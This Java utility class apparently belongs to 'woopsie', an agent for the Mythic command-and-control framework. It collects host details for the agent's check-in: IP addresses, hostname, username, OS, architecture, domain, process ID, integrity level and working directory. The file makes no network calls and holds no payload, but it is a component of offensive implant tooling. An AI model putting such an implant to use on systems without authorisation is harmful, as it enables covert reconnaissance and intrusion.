package com.woopsie.utils;

import com.woopsie.Config;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

/**
 * Collects system information for agent checkin
 */
public class SystemInfo {
    
    /**
     * Get all non-loopback IP addresses
     */
    public static List<String> getIpAddresses(Config config) {
        List<String> ips = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                if (iface.isUp() && !iface.isLoopback()) {
                    Enumeration<InetAddress> addresses = iface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        InetAddress addr = addresses.nextElement();
                        ips.add(addr.getHostAddress());
                    }
                }
            }
            Config.debugLog(config, "Detected IPs: " + ips);
        } catch (Exception e) {
            Config.debugLog(config, "Failed to get IP addresses: " + e.getMessage());
        }
        return ips;
    }
    
    /**
     * Get system hostname
     */
    public static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    /**
     * Get current username
     */
    public static String getUsername() {
        return System.getProperty("user.name", "unknown");
    }
    
    /**
     * Get OS name and version
     */
    public static String getOS() {
        String osName = System.getProperty("os.name", "Unknown");
        String osVersion = System.getProperty("os.version", "");
        return osName + (osVersion.isEmpty() ? "" : " " + osVersion);
    }
    
    /**
     * Get current process ID
     */
    public static int getPid() {
        try {
            return (int) ProcessHandle.current().pid();
        } catch (Exception e) {
            return -1;
        }
    }
    
    /**
     * Get system architecture (normalized to Mythic conventions)
     */
    public static String getArchitecture() {
        String arch = System.getProperty("os.arch", "unknown");
        // Map to Mythic conventions
        switch (arch.toLowerCase()) {
            case "amd64":
            case "x86_64":
                return "x64";
            case "x86":
            case "i386":
            case "i686":
                return "x86";
            case "aarch64":
                return "ARM64";
            case "arm":
                return "ARM";
            default:
                return arch;
        }
    }
    
    /**
     * Get domain name (Windows) or hostname (Unix)
     */
    public static String getDomain() {
        try {
            // Try to get domain from environment (Windows)
            String domain = System.getenv("USERDOMAIN");
            if (domain != null && !domain.isEmpty()) {
                return domain;
            }
            // Fallback to hostname
            return getHostname();
        } catch (Exception e) {
            return "WORKGROUP";
        }
    }
    
    public static int getIntegrityLevel() {
        // Try Windows API first
        String osName = System.getProperty("os.name");
        System.err.println("[DEBUG] getIntegrityLevel: os.name = " + osName);
        
        if (osName != null && osName.toLowerCase().contains("win")) {
            System.err.println("[DEBUG] getIntegrityLevel: Detected Windows, calling WindowsAPI");
            Integer integrityLevel = WindowsAPI.getCurrentProcessIntegrityLevel();
            System.err.println("[DEBUG] getIntegrityLevel: WindowsAPI returned: " + integrityLevel);
            if (integrityLevel != null) {
                return integrityLevel;
            }
            System.err.println("[DEBUG] getIntegrityLevel: WindowsAPI returned null, using fallback");
        } else {
            System.err.println("[DEBUG] getIntegrityLevel: Not Windows, using fallback");
        }
        
        // Fallback for Linux or if Windows API fails
        String username = getUsername();
        if ("root".equals(username) || "SYSTEM".equalsIgnoreCase(username)) {
            return 3; // High/System
        }
        return 2; // Medium
    }
    
    /**
     * Get process name
     */
    public static String getProcessName() {
        try {
            String javaCommand = System.getProperty("sun.java.command", "");
            if (!javaCommand.isEmpty()) {
                String[] parts = javaCommand.split(" ");
                if (parts.length > 0) {
                    String name = parts[0];
                    if (name.endsWith(".jar")) {
                        return name.substring(name.lastIndexOf('/') + 1);
                    }
                }
            }
            return "java";
        } catch (Exception e) {
            return "woopsie";
        }
    }
    
    /**
     * Get current working directory
     */
    public static String getCurrentDirectory() {
        return System.getProperty("user.dir", ".");
    }
}
